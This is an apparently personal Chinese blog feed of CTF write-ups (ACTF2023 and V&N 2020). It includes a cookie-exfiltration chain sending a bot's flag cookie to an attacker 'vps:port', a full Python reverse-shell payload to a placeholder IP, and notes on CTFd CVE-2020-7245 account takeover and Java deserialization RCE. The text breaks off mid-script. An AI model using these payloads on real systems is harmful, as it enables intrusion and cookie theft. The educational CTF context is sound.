= req.<span class="hljs-property">body</span>    <span class="hljs-keyword">let</span> vip_url = <span class="hljs-variable constant_">VIP_URL</span>    <span class="hljs-keyword">let</span> data = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(username, vip_url), &#123;        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,        <span class="hljs-attr">headers</span>: &#123;            <span class="hljs-title class_">Cookie</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(req.<span class="hljs-property">cookies</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[k, v]</span>) =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;k&#125;</span>=<span class="hljs-subst">$&#123;v&#125;</span>`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;; &#x27;</span>)        &#125;,        <span class="hljs-attr">body</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(&#123; code &#125;)    &#125;)).<span class="hljs-title function_">text</span>()    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;ok&#x27;</span> == data) &#123;        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-title function_">sign</span>(&#123; username, <span class="hljs-attr">isVip</span>: <span class="hljs-literal">true</span> &#125;))        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Congratulation! You are VIP now.&#x27;</span>)    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-title function_">send</span>(data)    &#125;&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/share/:id&#x27;</span>, reportLimiter, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>    <span class="hljs-keyword">if</span> (!id) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;no note id specified&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">const</span> url = <span class="hljs-string">`http://localhost:<span class="hljs-subst">$&#123;PORT&#125;</span>/note/<span class="hljs-subst">$&#123;id&#125;</span>`</span>    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">await</span> <span class="hljs-title function_">visit</span>(url)        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;done&#x27;</span>)    &#125; <span class="hljs-keyword">catch</span> (e) &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;something error&#x27;</span>)    &#125;&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Genshin start!&#x27;</span>)&#125;)app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listen on <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)&#125;</code></pre></div><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APP_HOST</span> = <span class="hljs-string">&#x27;localhost&#x27;</span><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APP_PORT</span> = <span class="hljs-number">3000</span><span class="hljs-keyword">const</span> <span class="hljs-title function_">visit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`start: <span class="hljs-subst">$&#123;url&#125;</span>`</span>)    <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>(&#123;        <span class="hljs-attr">headless</span>: <span class="hljs-string">&#x27;new&#x27;</span>,        <span class="hljs-attr">executablePath</span>: <span class="hljs-string">&#x27;/usr/bin/google-chrome-stable&#x27;</span>,        <span class="hljs-attr">args</span>: [<span class="hljs-string">&#x27;--no-sandbox&#x27;</span>],    &#125;)    <span class="hljs-keyword">const</span> ctx = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createIncognitoBrowserContext</span>();    <span class="hljs-keyword">try</span>&#123;        <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">newPage</span>();        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">setCookie</span>(&#123;            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,            <span class="hljs-attr">value</span>: <span class="hljs-variable constant_">FLAG</span>,            <span class="hljs-attr">domain</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;APP_HOST&#125;</span>:<span class="hljs-subst">$&#123;APP_PORT&#125;</span>`</span>,            <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>        &#125;)        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(url, &#123;<span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>&#125;)        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>)        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">close</span>()    &#125;<span class="hljs-keyword">catch</span>(e)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);    &#125;</code></pre></div><p>可以看到flag被设置在了cookie中，并且设定了域</p><p>unknown师傅的<a href="https://unk.icu/2023/10/31/browser-test/">浏览器请求实验</a>提到携带cookie的条件</p><p>协议跨域（跨域资源访问CORS）</p><div class="code-wrapper"><pre><code class="hljs text">这个最简单，被访问域名在webservice配置跨域访问的header即可。会用到两个headerAccess-Control-Allow-Origin:   * | 访问域名;Access-Control-Allow-Methods:  GET | POST | PUT | DELETE;</code></pre></div><p>先找到visit，发现url正好满足domain的要求，这里便是入口点</p><div class="code-wrapper"><pre><code class="hljs csharp">app.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;/share/:id&#x27;</span>, reportLimiter, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-function"><span class="hljs-keyword">params</span></span><span class="hljs-function">    <span class="hljs-title">if</span> (<span class="hljs-params">!id</span>)</span> &#123;        res.send(<span class="hljs-string">&#x27;no note id specified&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">const</span> url = `http:<span class="hljs-comment">//localhost:$&#123;PORT&#125;/note/$&#123;id&#125;`</span>    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">await</span> visit(url)        res.send(<span class="hljs-string">&#x27;done&#x27;</span>)    &#125; <span class="hljs-keyword">catch</span> (e) &#123;        console.log(e)        res.send(<span class="hljs-string">&#x27;something error&#x27;</span>)    &#125;&#125;)</code></pre></div><p>然后大佬十分敏感的发现id可以进行穿越</p><p>接着分析其他代码，可以发现三处new URL()，借用unknown师傅测试结果</p><div class="code-wrapper"><pre><code class="hljs awk">new URL(<span class="hljs-string">&quot;1&quot;</span>, `http:<span class="hljs-regexp">//</span><span class="hljs-variable">$&#123;req.headers.host&#125;</span><span class="hljs-regexp">/theme/</span>`)这个url是http:<span class="hljs-regexp">//</span><span class="hljs-variable">$&#123;req.headers.host&#125;</span><span class="hljs-regexp">/theme/</span><span class="hljs-number">1</span>new URL(<span class="hljs-string">&quot;http://vps:port/&quot;</span>, `http:<span class="hljs-regexp">//</span><span class="hljs-variable">$&#123;req.headers.host&#125;</span><span class="hljs-regexp">/theme/</span>`)这个url就是http:<span class="hljs-regexp">//</span>vps:port/，第二个参数不生效。</code></pre></div><p>我们可以控制为自己的服务器</p><p>vip路由处的</p><div class="code-wrapper"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/vip&#x27;</span>, auth, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">let</span> data = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(username, vip_url), &#123;        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,        <span class="hljs-attr">headers</span>: &#123;            <span class="hljs-title class_">Cookie</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(req.<span class="hljs-property">cookies</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[k, v]</span>) =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;k&#125;</span>=<span class="hljs-subst">$&#123;v&#125;</span>`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;; &#x27;</span>)        &#125;,        <span class="hljs-attr">body</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(&#123; code &#125;)    &#125;)).<span class="hljs-title function_">text</span>()</code></pre></div><p>可以通过login时的username来控制为我们的服务器的地址，并且此处发送了cookie数据，那么这里监听时就可以看到发送的cookie，flag就会在其中，这里就是我们最终要到达的地方</p><p>但是由于share路由处时GET请求，此处为POST请求，穿越时无法满足，所以先找其他地方</p><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p>note路由也有new URL</p><div class="code-wrapper"><pre><code class="hljs csharp">app.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;/note/:id&#x27;</span>, (req, res) =&gt; &#123;    <span class="hljs-keyword">const</span> note = notes.<span class="hljs-keyword">get</span>(req.<span class="hljs-keyword">params</span>.id)    <span class="hljs-keyword">const</span> &#123; tex, theme &#125; = <span class="hljs-function">note</span><span class="hljs-function">    <span class="hljs-title">if</span> (<span class="hljs-params">theme</span>)</span> &#123;        <span class="hljs-keyword">base</span> = <span class="hljs-keyword">new</span> URL(theme, `http:<span class="hljs-comment">//$&#123;req.headers.host&#125;/theme/`) + &#x27;/&#x27;</span>    &#125;    res.render(<span class="hljs-string">&#x27;note.html&#x27;</span>, &#123; tex, nonce, <span class="hljs-keyword">base</span>, theme_url &#125;)&#125;)</code></pre></div><p>但有趣的是，在note.html中有这样一段</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span></span><span class="hljs-tag">        <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &lt;%= theme_url %&gt; https://getbootstrap.com https://cdn.jsdelivr.net &#x27;nonce-&lt;%= nonce %&gt;&#x27;;&quot;</span>&gt;</span></code></pre></div><p><strong>内容安全策略</strong>（<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP">CSP</a>）是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS)和数据注入攻击等</p><p>即使成为了vip，设置了theme为自己服务器上的js代码，令bot去访问也无法引用执行</p><p>最后只剩下preview处的</p><div class="code-wrapper"><pre><code class="hljs reasonml">app.get(&#x27;/preview&#x27;,<span class="hljs-function"> (<span class="hljs-params">req</span>, <span class="hljs-params">res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> &#123; tex, theme &#125; = req.query    <span class="hljs-keyword">if</span> (theme) &#123;        base = <span class="hljs-keyword">new</span> <span class="hljs-constructor">URL(<span class="hljs-params">theme</span>, `<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>$&#123;<span class="hljs-params">req</span>.<span class="hljs-params">headers</span>.<span class="hljs-params">host</span>&#125;<span class="hljs-operator">/</span><span class="hljs-params">theme</span><span class="hljs-operator">/</span>`)</span> + <span class="hljs-character">&#x27;/&#x27;</span>    &#125;    res.render(&#x27;preview.html&#x27;, &#123; tex, nonce, base &#125;)&#125;)</code></pre></div><p>简直完美</p><p>我们把服务器地址放上去，然后拿burp抓包发现它在访问我们服务器上的一些文件</p><p><img src="/../images/ACTF2023/image-20231101234943726.png" alt="image-20231101234943726"></p><p>关键就在这里，我们在服务器上按照路径写一个base.js，让他去请求vip路由，</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//也可以不写login，先手动登录，再把cookie放进来，总之核心在于username被放在cookie中</span><span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,&#123;        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,        <span class="hljs-attr">redirect</span>:<span class="hljs-string">&quot;follow&quot;</span>,        //<span class="hljs-attr">credentials</span>: <span class="hljs-string">&quot;include&quot;</span>,           大佬们都加了这个        <span class="hljs-attr">headers</span>:&#123;                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>                      &#125;,            <span class="hljs-attr">body</span>:<span class="hljs-string">&quot;username=http://vps:port&amp;password=(http://vps:port的md5)&quot;</span>&#125;);console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/vip&#x27;</span>,&#123;        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>        //<span class="hljs-attr">credentials</span>: <span class="hljs-string">&quot;include&quot;</span>&#125;)</code></pre></div><p><code>credentials</code>属性指定是否发送 Cookie。可能的取值如下：</p><blockquote><ul><li><code>same-origin</code>：默认值，同源请求时发送 Cookie，跨域请求时不发送。</li><li><code>include</code>：不管同源请求，还是跨域请求，一律发送 Cookie。</li><li><code>omit</code>：一律不发送。</li></ul></blockquote><p>unknown总结</p><blockquote><ul><li><p>浏览器发请求时是否带cookie要看domain和path，而domain即<code>host:port</code>。</p><p>加了<code>credentials: &#39;include&#39;</code>，domain只包括host。所以满足host相同，path为path及其子path时，就带cookie。</p></li></ul></blockquote><p>最后python启一个http服务给preview路由进行访问</p><p>nc监听username对应的端口</p><p><img src="/../images/ACTF2023/image-20231101235803885.png" alt="image-20231101235803885"></p><p>但奇怪的是我这里连测试的flag都没有，不知道是不是其环境时出了什么错</p><h2 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h2><p>使用gitlab的webhook来请求</p><p>jenkins的RCE，利用groovy</p><p>唉，算了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>已发生的比赛刷题</title>
    <link href="/2023/10/23/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/"/>
    <url>/2023/10/23/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="v-n-2020-（环境不好弄，看看别人的题解）"><a href="#v-n-2020-（环境不好弄，看看别人的题解）" class="headerlink" title="v&amp;n 2020   （环境不好弄，看看别人的题解）"></a>v&amp;n 2020   （环境不好弄，看看别人的题解）</h1><p><a href="https://www.zhaoj.in/read-6407.html">https://www.zhaoj.in/read-6407.html</a></p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<span class="hljs-keyword">import</span> osapp = Flask(__name__) flag_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<span class="hljs-comment"># flag = flag_file.read()</span><span class="hljs-comment"># flag_file.close()</span><span class="hljs-comment">#</span><span class="hljs-comment"># @app.route(&#x27;/flag&#x27;)</span><span class="hljs-comment"># def flag():</span><span class="hljs-comment">#     return flag</span><span class="hljs-comment">## want flag? naive!</span> <span class="hljs-comment"># You will never find the thing you want:) I think</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shell&#x27;</span></span>)  </span><span class="hljs-comment">#shell可以执行系统命令</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell</span>():    os.system(<span class="hljs-string">&quot;rm -f flag.txt&quot;</span>)  <span class="hljs-comment"># 执行shell函数时会删除flag文件</span>    exec_cmd = request.args.get(<span class="hljs-string">&#x27;c&#x27;</span>)  <span class="hljs-comment"># 利用参数c来写入系统命令</span>    os.system(exec_cmd)    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read() <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre></div><p>程序在最开始打开了 <code>flag </code>文件，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用<code>rm -f flag.txt</code>）删除之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 fd 文件描述符目录下还是会有这个文件的 <code>fd</code>，通过这个我们即可得到被删除文件的内容。</p><p>简而言之就是没有关闭文件，能通过&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;xxxx  来查看被删除的文件内容</p><p><code>/proc/[pid]/fd </code>这个目录里包含了进程打开文件的情况,pid就是进程记录的打开文件的序号.</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">/<span class="hljs-built_in">shell</span>?c=python3%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>import%<span class="hljs-number">20</span><span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;你的ip&quot;</span>,<span class="hljs-number">8089</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);%<span class="hljs-number">27</span></code></pre></div><p>python反弹shell</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023171623345.png" alt="image-20231023171623345"></p><h3 id="小附带一个知识"><a href="#小附带一个知识" class="headerlink" title="小附带一个知识"></a>小附带一个知识</h3><div class="code-wrapper"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$rmf</span> = function($file)&#123;</span>    <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;rm -f -- &#x27;</span>.escapeshellarg(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>));&#125;;</code></pre></div><p>PHP 调用 <code>system</code> 的时候会启用一个新进程，而该进程的 <code>cmdline</code> 则正是由 <code>rm -f --</code> 在 sh 中构成的符合 <code>\0</code> 格式标准的字符串</p><p><code>/proc/sys/kernel/ns_last_pid</code>      这个文件会记录最近一次进程使用的 PID</p><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>版本php：<strong>5.6.23</strong>     （关键）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/vendor/autoload.php&#x27;</span>; <span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>; <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment">//若返回内容中有success即可读取flag</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;    <span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();    <span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">TRUE</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;success&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);    &#125;&#125; <span class="hljs-comment">//查看文件内容</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>])) &#123;    <span class="hljs-title function_ invoke__">phpinfo</span>();&#125;</code></pre></div><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172600164.png" alt="image-20231023172600164"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172615615.png" alt="image-20231023172615615"></p><h3 id="解法-HTTPoxy漏洞"><a href="#解法-HTTPoxy漏洞" class="headerlink" title="解法 HTTPoxy漏洞"></a>解法 HTTPoxy漏洞</h3><p>所有以CGI或Fastcgi运行的程序理论上都受到影响</p><p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上<code>HTTP_</code> 前缀， 注册为环境变量, 所以如果你在Header中发送一个<code>Proxy:xxxxxx</code>, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“<code>HTTP_PROXY</code>“)就变成可被控制的了</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172954085.png" alt="image-20231023172954085"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023173050175.png" alt="image-20231023173050175"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174907255.png" alt="image-20231023174907255"></p><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p><strong>CVE-2020-7245</strong></p><p>当时ctfd的1day漏洞</p><p>通过分析他是如何修复的，逆向思考出利用方法</p><p>前在验证的时候没有把用户名两头的空格给去掉，直接使用拿到的参数进行比较</p><p>在保存的时候，却是保存的去掉空格之后的数据。  name &#x3D; name.strip()</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>注册 ”空格+管理员“</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174517818.png" alt="image-20231023174517818"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174526872.png" alt="image-20231023174526872"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174539645.png" alt="image-20231023174539645"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174556692.png" alt="image-20231023174556692"></p><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>。。。自己先大致看了一遍，但要是细看的话很多地方没看懂，也漏看了关键部分</p><p>ClentInfoFilter 类，用于从 cookie 里进行反序列化的拦截器。</p><p>第一次访问时会序列化一个新的 ClientInfo 对象，用户名 Anonymous 用户组 normal，然后 base64 之后存入 cinfo cookie。再次访问时利用这个 cookie 反序列化为之前的对象。</p><p>然后来看看 Controller 代码逻辑，需要用户名为 admin 用户组为 webmanager。</p><p>然后自己伪造</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182241410.png" alt="image-20231023182241410"></p><p>有了admin的身份后，尝试读取文件和文件上传是否存在漏洞</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182443294.png" alt="image-20231023182443294"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182457651.png" alt="image-20231023182457651"></p><p>答案是权限不足</p><p>那么继续来看最后一个漏洞点，就是不反序列化 ClientInfo 了，尝试反序列化 Tools 类，其中有一个命令执行点。</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182557807.png" alt="image-20231023182557807"></p><p>如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将<strong>调用默认的</strong>方法来根据目标类中的属性来进行序列化和反序列化</p><p>而如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将<strong>调用目标类</strong>指定的<code>writeObject或readObject</code>方法来实现。<br><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182813275.png" alt="image-20231023182813275"></p><p>修改为String数组，并增加get、set方法</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182852817.png" alt="image-20231023182852817"></p><p>覆盖即可反弹shell</p><h2 id="misc-多了解一些吧，反正也不会"><a href="#misc-多了解一些吧，反正也不会" class="headerlink" title="misc   (多了解一些吧，反正也不会)"></a>misc   (多了解一些吧，反正也不会)</h2><h3 id="拉胯的三条命令"><a href="#拉胯的三条命令" class="headerlink" title="拉胯的三条命令"></a>拉胯的三条命令</h3><p>nmap流量分析，查看开放端口</p><p><code>SYN</code>建立连接     <code>ACK</code>响应</p><p>找同时有 <code>SYN,ACK</code>的端口</p><h3 id="ML的第一步"><a href="#ML的第一步" class="headerlink" title="ML的第一步"></a>ML的第一步</h3><p>机器学习</p><p>给出七十组x,y   ，对函数进行拟合</p><p>然后回答出x所对应的y的值</p><div class="code-wrapper"><pre><code class="hljs scss">import reimport numpy as np from pwn import *def <span class="hljs-built_in">process</span>(data):    x_data = []    y_data = []    for i in data:        z = i.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)        x = <span class="hljs-built_in">float</span>(z[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:])        x_data.<span class="hljs-built_in">append</span>(x)        y = <span class="hljs-built_in">float</span>(z[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>])        y_data.<span class="hljs-built_in">append</span>(y)    return (np.<span class="hljs-built_in">array</span>(x_data),np.<span class="hljs-built_in">array</span>(y_data))if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29773</span>)    <span class="hljs-built_in">print</span>(p.<span class="hljs-built_in">recvline</span>())    p.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">&#x27;H3rmesk1t&#x27;</span>)    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):        <span class="hljs-built_in">print</span>(p.<span class="hljs-built_in">recvline</span>())    p.<span class="hljs-built_in">sendline</span>()    data = []    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">70</span>):        data.<span class="hljs-built_in">append</span>(p.<span 